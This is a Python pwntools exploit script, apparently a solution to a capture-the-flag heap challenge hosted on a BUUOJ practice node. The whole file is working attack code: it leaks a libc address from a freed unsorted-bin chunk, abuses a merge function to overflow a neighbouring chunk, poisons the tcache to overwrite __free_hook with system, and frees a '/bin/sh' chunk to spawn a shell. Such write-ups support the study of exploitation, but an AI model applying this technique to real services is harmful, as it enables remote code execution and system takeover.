from pwn import *
#p=process('./1')
#libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
p=remote('node3.buuoj.cn',25456)
libc=ELF('libc-2.27_64.so')
context.terminal = ['tmux','splitw','-h']
def debug():
    gdb.attach(p)
    pause()
def add(len,con):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('len:')
    p.sendline(str(len))
    p.recvuntil('content:')
    p.sendline(str(con))
def show(idx):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('idx:')
    p.sendline(str(idx))
def delete(idx):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('idx:')
    p.sendline(str(idx))
def merge(idx1,idx2):
    p.recvuntil('>>')
    p.sendline('4')
    p.recvuntil('idx1:')
    p.sendline(str(idx1))
    p.recvuntil('idx2:')
    p.sendline(str(idx2))
    
for i in range(8):
    add(0x80, 'aaaa')

for i in range(1, 8):
    delete(i)
delete(0)
add(0x8,8*'a')#0
show(0)
#libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-224-libc.sym['main_arena']
0x3ebc40
libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-224-0x3ebc40
print hex(libc.address)
add(0x60,'aaaa')#1
add(0x30,'a'*0x30)#2
add(0x38,'b'*0x38)#3
add(0x100,'a')#4
add(0x68,'a')#5
add(0x20,'a')#6
add(0x20,'a')#7
add(0x20,'a')#8
add(0x20,'/bin/sh\x00')#9
delete(5)
delete(7)
delete(8)
merge(2,3)#5      6->size=0x111
delete(6)
payload=0x28*'a'+p64(0x31)+p64(libc.sym['__free_hook'])+p64(0)
add(0x100,payload)#6
add(0x20,'a')
add(0x20,'a')
add(0x20,p64(libc.sym['system']))
delete(9)
p.interactive()
